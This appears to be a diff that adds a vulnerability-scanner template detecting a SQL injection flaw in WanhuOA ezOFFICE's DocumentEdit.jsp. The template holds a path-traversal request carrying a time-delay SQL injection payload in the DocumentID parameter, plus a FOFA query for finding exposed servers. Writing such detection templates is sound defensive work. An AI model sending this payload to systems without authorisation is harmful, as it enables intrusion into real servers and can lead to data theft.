@@ -1,0 +1,30 @@
+id: wanhu-documentedit-sqli
+
+info:
+  name: WanhuOA DocumentEdit.jsp - SQL Injection
+  author: xc
+  severity: high
+  description: |
+    The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:7'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
+          - 'status_code == 200'
+          - 'contains_all(body, "iSignature", "DoYFSignature")'
+        condition: and
+
+# digest: 4a0a00473045022016f9af257412b4bfe0762314c3f3971596633859cfa90626787c8efea19e60a30221009eeccd9426f5c7a49e0d377e2335c4b191262964c243a24357babd9b63be858b:922c64590222798bb761d5b6d8e72950
